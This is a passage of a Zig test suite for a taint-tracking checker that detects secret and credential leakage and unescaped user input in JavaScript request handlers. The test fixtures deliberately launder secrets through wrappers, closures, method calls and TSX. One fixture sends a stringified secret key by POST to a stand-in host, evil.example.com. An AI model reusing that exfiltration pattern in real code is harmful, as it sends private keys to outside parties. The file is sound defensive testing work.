    try std.testing.expectEqual(DataLabel.credential, parseDataLabel("credential").?);
    try std.testing.expectEqual(DataLabel.user_input, parseDataLabel("user_input").?);
    try std.testing.expectEqual(DataLabel.config, parseDataLabel("config").?);
    try std.testing.expectEqual(DataLabel.internal, parseDataLabel("internal").?);
    try std.testing.expectEqual(DataLabel.external, parseDataLabel("external").?);
    try std.testing.expectEqual(DataLabel.validated, parseDataLabel("validated").?);
    try std.testing.expect(parseDataLabel("unknown_label") == null);
    try std.testing.expect(parseDataLabel("") == null);
}

test "parseExternalLabels with valid JSON" {
    const json =
        \\{
        \\  "labels": [
        \\    { "field": "User.email", "label": "secret", "reason": "PII field" },
        \\    { "field": "token", "label": "credential", "reason": "auth token" }
        \\  ]
        \\}
    ;
    const labels = try parseExternalLabels(std.testing.allocator, json);
    defer {
        for (labels) |l| {
            std.testing.allocator.free(l.field);
            std.testing.allocator.free(l.reason);
        }
        std.testing.allocator.free(labels);
    }

    try std.testing.expectEqual(@as(usize, 2), labels.len);
    try std.testing.expectEqualStrings("User.email", labels[0].field);
    try std.testing.expectEqual(DataLabel.secret, labels[0].label);
    try std.testing.expectEqualStrings("PII field", labels[0].reason);
    try std.testing.expectEqualStrings("token", labels[1].field);
    try std.testing.expectEqual(DataLabel.credential, labels[1].label);
    try std.testing.expectEqualStrings("auth token", labels[1].reason);
}

test "parseExternalLabels with empty labels array" {
    const json =
        \\{ "labels": [] }
    ;
    const labels = try parseExternalLabels(std.testing.allocator, json);
    defer std.testing.allocator.free(labels);

    try std.testing.expectEqual(@as(usize, 0), labels.len);
}

test "setExternalLabels registers short form from qualified name" {
    // We cannot construct a full FlowChecker without a valid IrView,
    // so test the external label maps directly via a minimal instance.
    // The IrView is only used by check/walkStmt, not by setExternalLabels.
    var checker = FlowChecker.init(std.testing.allocator, undefined, null);
    defer {
        // Clean up only the maps we populated (skip ir_view-dependent deinit)
        var li = checker.external_labels.iterator();
        while (li.next()) |entry| checker.allocator.free(entry.key_ptr.*);
        checker.external_labels.deinit(checker.allocator);
        var ri = checker.external_reasons.iterator();
        while (ri.next()) |entry| {
            checker.allocator.free(entry.key_ptr.*);
            checker.allocator.free(entry.value_ptr.*);
        }
        checker.external_reasons.deinit(checker.allocator);
    }

    const ext = [_]ExternalLabel{
        .{ .field = "User.email", .label = .secret, .reason = "PII field" },
        .{ .field = "plainField", .label = .credential, .reason = "token data" },
    };
    checker.setExternalLabels(&ext);

    // Qualified name registered
    const email_labels = checker.external_labels.get("User.email").?;
    try std.testing.expect(email_labels.has(.secret));

    // Short form also registered
    const short_labels = checker.external_labels.get("email").?;
    try std.testing.expect(short_labels.has(.secret));

    // Non-qualified name registered directly (no dot, no short form duplication)
    const plain_labels = checker.external_labels.get("plainField").?;
    try std.testing.expect(plain_labels.has(.credential));

    // Reasons registered
    try std.testing.expectEqualStrings("PII field", checker.external_reasons.get("User.email").?);
    try std.testing.expectEqualStrings("PII field", checker.external_reasons.get("email").?);
    try std.testing.expectEqualStrings("token data", checker.external_reasons.get("plainField").?);
}

test "propertyTagForKind: every DiagnosticKind maps to the expected PropertyTag" {
    // Lock the current mapping. If a future change re-routes a flow-sink
    // category to a different property bucket, this assertion forces a
    // conscious update — without it, a silent mis-routing would weaken
    // the proven-property set in ways the existing flow tests would not
    // catch.
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_response),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_log),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_egress_url),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_egress_body),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_response),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_log),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_egress_url),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .injection_safe),
        propertyTagForKind(.unvalidated_input_in_egress),
    );
}

test "propertyTagForKind: every DiagnosticKind variant maps to a non-null PropertyTag" {
    // Exhaustiveness lock. The per-variant assertions above pin the
    // current mapping; this test pins the more important invariant that
    // EVERY variant maps to something. Without it, a future maintainer
    // adding a new DiagnosticKind can satisfy Zig's switch exhaustiveness
    // with `else => null,` — both the compiler and the per-variant test
    // stay green while the new variant silently disappears from the
    // proven-property surface (callers like proof_trace and
    // pi_repair_plan all use `orelse continue`).
    inline for (@typeInfo(DiagnosticKind).@"enum".fields) |field| {
        const kind: DiagnosticKind = @enumFromInt(field.value);
        const tag = propertyTagForKind(kind);
        std.testing.expect(tag != null) catch |err| {
            std.log.err(
                "DiagnosticKind.{s} has no PropertyTag mapping; add an arm to propertyTagForKind",
                .{field.name},
            );
            return err;
        };
    }
}

test "a real secret leak offers no repair intent" {
    // The end-to-end half of the invariant below: a ZTS400 produced by the
    // actual checker on actual source, not a struct built in a test.
    //
    // This test previously asserted the opposite. The reasoning it carried -
    // "the agent inserts a redact/mask/strip call ahead of the offending sink"
    // - describes an edit `insert_guard_before_line` does not make: the
    // primitive inserts a conditional, and no conditional removes a taint
    // label. The claim went unchallenged while nothing consumed the intent.
    // Once diagnostics began carrying it to the model, a recorded case burned
    // its whole attempt budget trying to build the guard this promised.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.json({ leaked: secret });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var saw_secret_leak: bool = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) {
            saw_secret_leak = true;
            try std.testing.expectEqual(@as(?RepairIntent, null), d.repair_intent);
        }
    }
    try std.testing.expect(saw_secret_leak);
}

test "FlowChecker flags secret returned through a variable-held response" {
    // The sink check must resolve `return res` back to the Response call that
    // produced it; a binding hop must not skip the response-sink analysis.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const res = Response.json({ leaked: secret });
        \\  return res;
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags unvalidated input in a variable-held Response.html" {
    const allocator = std.testing.allocator;
    const source =
        \\function handler(req) {
        \\  const page = Response.html(req.query.q);
        \\  return page;
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .unvalidated_input_in_egress) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().injection_safe);
}

test "FlowChecker flags secret returned through a ternary response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return req.query.debug ? Response.json({ leaked: secret }) : Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "FlowChecker keeps taint through a user-defined wrapper call" {
    // A helper that returns its argument must not strip labels; dropping them
    // here launders any taint through a one-line wrapper.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function wrap(v) { return v; }
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.json({ leaked: wrap(secret) });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker keeps validated label through a wrapper returning a validator result" {
    // The callee summary must carry the callee's actual return labels: a
    // wrapper around escapeHtml yields .validated, not the argument union,
    // so no false XSS warning fires.
    const allocator = std.testing.allocator;
    const source =
        \\import { escapeHtml } from "zttp:text";
        \\function clean(v) { return escapeHtml(v); }
        \\function handler(req) {
        \\  return Response.html(clean(req.query.q));
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    for (checker.getDiagnostics()) |d| {
        try std.testing.expect(d.kind != .unvalidated_input_in_egress);
    }
    try std.testing.expect(checker.getProperties().injection_safe);
}

/// Shared harness for the cross-file path: run `exportedReturnLabels` over
/// `imported_source` for `name`, install the result on a checker built over
/// `source`, and report whether no_secret_leakage was proven. Mirrors what the
/// caller does with a real file, without touching the filesystem.
fn runWithImportedFunction(
    allocator: std.mem.Allocator,
    source: []const u8,
    imported_source: []const u8,
    name: []const u8,
) !bool {
    var imported_parser = try @import("zts-engine").parser.JsParser.init(allocator, imported_source);
    var imported_atoms = atom_table.AtomTable.init(allocator);
    defer imported_atoms.deinit();
    imported_parser.setAtomTable(&imported_atoms);
    defer imported_parser.deinit();
    _ = try imported_parser.parse();
    const imported_view = IrView.fromIRStore(&imported_parser.nodes, &imported_parser.constants);

    var imported_checker = FlowChecker.init(allocator, imported_view, &imported_atoms);
    defer imported_checker.deinit();
    const imported_labels = imported_checker.exportedReturnLabels(name) orelse
        return error.ExportNotFound;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    // The import's local slot, recovered the way the caller recovers it.
    var facts = try @import("pipeline.zig").buildModuleFacts(
        allocator,
        @import("pipeline.zig").ParsedModule.fromExisting(ir_view, root, &atoms),
        null,
    );
    defer facts.deinit();
    for (facts.imports.items) |rec| {
        if (std.mem.eql(u8, rec.imported_name, name)) {
            checker.setFileFunctionLabels(rec.slot, imported_labels);
        }
    }
    _ = try checker.check(handler_fn);
    return checker.getProperties().no_secret_leakage;
}

test "a secret returned by an imported function reaches the response" {
    const imported =
        \\import { env } from "zttp:env";
        \\export function readKey() { return env("SECRET_KEY"); }
    ;
    const source =
        \\import { readKey } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: readKey() }); }
    ;
    try std.testing.expect(!try runWithImportedFunction(
        std.testing.allocator,
        source,
        imported,
        "readKey",
    ));
}

test "an imported function carrying nothing keeps the property" {
    // The point of the cross-file summary: an ordinary helper in another file
    // must not cost the proof the way an untraceable call does.
    const imported =
        \\export function greet(name) { return ["hello ", name].join(""); }
    ;
    const source =
        \\import { greet } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: greet("world") }); }
    ;
    try std.testing.expect(try runWithImportedFunction(
        std.testing.allocator,
        source,
        imported,
        "greet",
    ));
}

/// Shared harness: parse `source`, run the FlowChecker on its handler, and
/// return whether no_secret_leakage was proven. Frees everything it owns.
fn runNoSecretLeakage(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().no_secret_leakage;
}

/// Shared harness: parse `source`, run the FlowChecker on its handler, and
/// return whether no_credential_leakage was proven.
fn runNoCredentialLeakage(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().no_credential_leakage;
}

/// Shared harness: parse `source`, run the FlowChecker on its handler, and
/// return whether input_validated was proven. The counterpart to the leakage
/// harnesses above - it checks the label a validator is entitled to discharge
/// rather than the ones it must not.
fn runInputValidated(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().input_validated;
}

test "FlowChecker flags a credential in a hoisted egress options object" {
    // Inline, the `headers` extractor sees the credential. Hoisted into a
    // binding the options object is no longer a literal, so the per-field
    // extractors return empty and only the whole-object fallback runs - and it
    // routes to the egress body sink, which checks secret and user input but
    // never credential.
    const source =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const token = req.headers.authorization;
        \\  const opts = { headers: { authorization: token } };
        \\  fetch("https://api.example.com/v1", opts);
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(!try runNoCredentialLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret returned by a callback a module invokes" {
    // A module export answers with its declared return labels, and `parallel`
    // declares `external`. Those describe what the module produces and cannot
    // describe what a caller's callback returns, so the secret vanished.
    const source =
        \\import { env } from "zttp:env";
        \\import { parallel } from "zttp:io";
        \\function handler(req) {
        \\  const results = parallel([() => env("SECRET_KEY")]);
        \\  return Response.json({ results: results });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret through a callback passed by name" {
    // Same laundering with the closure bound first. The argument is an
    // identifier, so finding it needs the declaration index rather than the
    // shape of the argument expression.
    const source =
        \\import { env } from "zttp:env";
        \\import { parallel } from "zttp:io";
        \\function handler(req) {
        \\  const cb = () => env("SECRET_KEY");
        \\  const results = parallel([cb]);
        \\  return Response.json({ results: results });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a durable step callback keeps determinism but not secrecy" {
    // The replay boundary neutralizes one label and not the other: the clock
    // read is recorded and replayed, so the response is the same on every run,
    // while a secret the callback returns is still a secret in the response.
    const deterministic_source =
        \\import { step } from "zttp:durable";
        \\function handler(req) { return Response.json({ at: step("ts", () => Date.now()) }); }
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, deterministic_source));

    const secret_source =
        \\import { env } from "zttp:env";
        \\import { step } from "zttp:durable";
        \\function handler(req) {
        \\  return Response.json({ k: step("key", () => env("SECRET_KEY")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, secret_source));
}

test "FlowChecker flags a secret produced by a closure argument" {
    // `inferLabels` had no arm for an arrow or function expression, so a
    // closure passed to a higher-order function contributed nothing and the
    // call's argument union came back empty - the positive claim that the
    // value carries no label. The secret rides out in the mapped array.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const keys = ["a", "b"].map(() => env("SECRET_KEY"));
        \\  return Response.json({ keys: keys });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through a helper chain past the summary depth" {
    // Nested zero-argument helpers put the `env` read past
    // `max_summary_depth`. The fallback used to be the union of the call's
    // arguments, which for a zero-argument call is empty, so the secret
    // arrived at the response carrying no label and the property held. It now
    // carries `.unknown` and the response sink refuses to prove.
    const source =
        \\import { env } from "zttp:env";
        \\function l10() { return env("SECRET_KEY"); }
        \\function l9() { return l10(); }
        \\function l8() { return l9(); }
        \\function l7() { return l8(); }
        \\function l6() { return l7(); }
        \\function l5() { return l6(); }
        \\function l4() { return l5(); }
        \\function l3() { return l4(); }
        \\function l2() { return l3(); }
        \\function l1() { return l2(); }
        \\function handler(req) { return Response.json({ v: l1() }); }
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker refuses to prove through a call it cannot resolve" {
    // `pick` is a parameter, so there is no body to walk. The old fallback
    // returned the argument union - empty here - which reads as the positive
    // claim that the value carries nothing.
    const source =
        \\function handler(req) {
        \\  const pick = req.pick;
        \\  return Response.json({ v: pick() });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker still proves a shallow helper chain" {
    // The conservative fallback must not swallow the ordinary case: a helper
    // the walk can enter, returning a value with no label, still proves.
    const source =
        \\function inner(x) { return x + 1; }
        \\function outer(x) { return inner(x) * 2; }
        \\function handler(req) { return Response.json({ v: outer(1) }); }
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through JSON.stringify in a response" {
    // A method-style call (member callee) must not strip taint labels off its
    // arguments: JSON.stringify(secret) reaching a response body leaks.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text(JSON.stringify({ pw: secret }));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through an array method in a response" {
    // The receiver of a method call carries taint too: [secret].join(",").
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text([secret].join(","));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through a string method in a response" {
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text(secret.slice(0));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through an optional method call in a response" {
    // `[secret]?.join(",")` - direct call through an optional receiver.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text([secret]?.join(","));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through a const-bound arrow wrapper" {
    // A concise arrow `(x) => x` bound to a const is stored with a
    // `.return_stmt` body; the callee summary must collect its return value's
    // labels, not infer them on the return_stmt node (which yields empty and
    // launders the taint).
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const echo = (x) => x;
        \\  return Response.text(echo(secret));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through JSON.stringify into an egress body" {
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  fetch("https://evil.example.com", { method: "POST", body: JSON.stringify({ k: secret }) });
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker proves no_secret_leakage for benign method calls on untainted data" {
    // The conservative member-call union must only fire when a real taint label
    // is present: non-secret data through .join/.map stays clean (no false FP).
    const source =
        \\function handler(req) {
        \\  const items = ["a", "b", "c"];
        \\  return Response.text(items.join(","));
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

const JsxCheckResult = struct { no_secret_leakage: bool, injection_safe: bool };

/// TSX-frontend harness: lower `source` to the core before parsing, run the
/// FlowChecker, and return the two properties the laundering tests assert on.
fn runJsxCheck(allocator: std.mem.Allocator, source: []const u8) !JsxCheckResult {
    var prepared = try source_frontend.PreparedSource.init(allocator, source, "flow-check.tsx", .{});
    defer prepared.deinit();
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, prepared.parserInput());
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return .{
        .no_secret_leakage = checker.getProperties().no_secret_leakage,
        .injection_safe = checker.getProperties().injection_safe,
    };
}

test "FlowChecker flags a secret interpolated through lowered TSX" {
    // Lowering makes `{secret}` an ordinary `h` argument. The conservative
    // call-argument union must retain that taint through renderToString.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.html(renderToString(<p>{secret}</p>));
        \\}
    ;
    const r = try runJsxCheck(std.testing.allocator, source);
    try std.testing.expect(!r.no_secret_leakage);
}

test "FlowChecker keeps injection_safe for request data escaped through renderToString" {
    // renderToString auto-escapes, so user input interpolated into JSX and sent
    // via Response.html is defended -- no XSS warning, injection_safe stays true.
    const source =
        \\function handler(req) {
        \\  return Response.html(renderToString(<p>Method: {req.method}</p>));
        \\}
    ;
    const r = try runJsxCheck(std.testing.allocator, source);
    try std.testing.expect(r.injection_safe);
}

const import_corpus = @import("tests/import_corpus.zig");

test "the import scan populates labels, meta, and the env slot in both atom modes" {
    // Replaces the differential that proved this scan matches the pre-C1
    // implementation. Both atom modes, per C1 finding 2.
    const allocator = std.testing.allocator;

    for ([_]bool{ true, false }) |use_atoms| {
        var parser = try @import("zts-engine").parser.JsParser.init(allocator,
            \\import { env } from "zttp:env";
            \\import { sha256 } from "zttp:crypto";
            \\import { thing } from "zttp-ext:unknown";
        );
        defer parser.deinit();
        var atoms = atom_table.AtomTable.init(allocator);
        defer atoms.deinit();
        if (use_atoms) parser.setAtomTable(&atoms);
        _ = try parser.parse();
        const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

        var checker = FlowChecker.init(allocator, ir_view, if (use_atoms) &atoms else null);
        defer checker.deinit();
        checker.scanImports();

        // Two builtins get meta; the unresolved module gets none.
        std.testing.expectEqual(@as(u32, 2), checker.module_fn_meta.count()) catch |err| {
            std.debug.print("\natoms={}: expected 2 meta entries, found {d}\n", .{ use_atoms, checker.module_fn_meta.count() });
            return err;
        };
        try std.testing.expect(checker.env_fn_slot != null);
        // Only functions with non-empty return labels land in the label map, so
        // this is a strict subset of the meta map rather than the same size.
        try std.testing.expect(checker.module_fn_labels.count() <= checker.module_fn_meta.count());
    }
}

test "the env slot is found through an alias, and unresolved modules are skipped" {
    const allocator = std.testing.allocator;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator,
        \\import { env as e } from "zttp:env";
        \\import { thing } from "zttp-ext:unknown";
    );
    defer parser.deinit();
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    _ = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    checker.scanImports();

    // Matched on the imported name, not the local alias.
    try std.testing.expect(checker.env_fn_slot != null);
    // Builtins only: the unresolved module contributes no meta entry.
    try std.testing.expectEqual(@as(u32, 1), checker.module_fn_meta.count());
}

test "FlowChecker flags a secret carried in an array literal" {
    // Guards the `array_literal` arm of inferLabels: an array must merge its
    // elements' labels the way an object literal merges its members', or a
    // secret launders through one pair of brackets.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const bundle = [secret];
        \\  return Response.json({ leaked: bundle });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "FlowChecker taints the base object through a member-access assignment" {
    // The statement form. `obj.field = secret;` parses as an expr_stmt wrapping
    // the assignment, so the label update in the `.assignment` arm never ran
    // and the mutated object read as clean at the response sink.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const out = {};
        \\  out.k = secret;
        \\  return Response.json(out);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "FlowChecker taints the base object through a computed-access assignment" {
    // `obj.field = secret` taints `obj`; `obj[key] = secret` walked to a
    // computed_access the root-binding walk had no arm for, so the label was
    // dropped entirely - the exact outcome that walk exists to prevent.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
